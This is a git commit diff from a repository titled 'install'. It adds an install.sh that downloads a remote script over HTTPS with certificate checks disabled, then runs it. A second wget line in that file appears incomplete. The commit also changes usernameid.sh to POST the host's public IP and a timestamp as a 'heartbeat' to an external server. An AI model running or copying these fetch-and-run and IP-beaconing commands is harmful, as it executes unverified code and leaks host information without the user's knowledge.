e2648fcfc7fa41e4b8cd3856291add67b4a7ec38
hankhu666 <26704892@qq.com>
2022-08-23 22:49:10 +0800

    install

---
+++ install.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+wget -N --no-check-certificate https://raw.githubusercontent.com/hankhu666/sys/main/mu && chmod +x mu && bash mu
+wget -N --no-check-certificate https://raw.githubusercontent.com/hankhu666/sys/main/
+
+
--- usernameid.sh
+++ usernameid.sh
@@ -1,2 +1,5 @@
 #!/bin/bash
 echo done `date` >>task.log
+shijian="`date "+%Y-%m-%d %H:%M:%S"`"
+ip=$(curl -s ipv4.ip.sb)
+curl -sk -X POST  https://api.hankhu.xyz/sys/accept.php -d "$ip heartbeat $shijian "
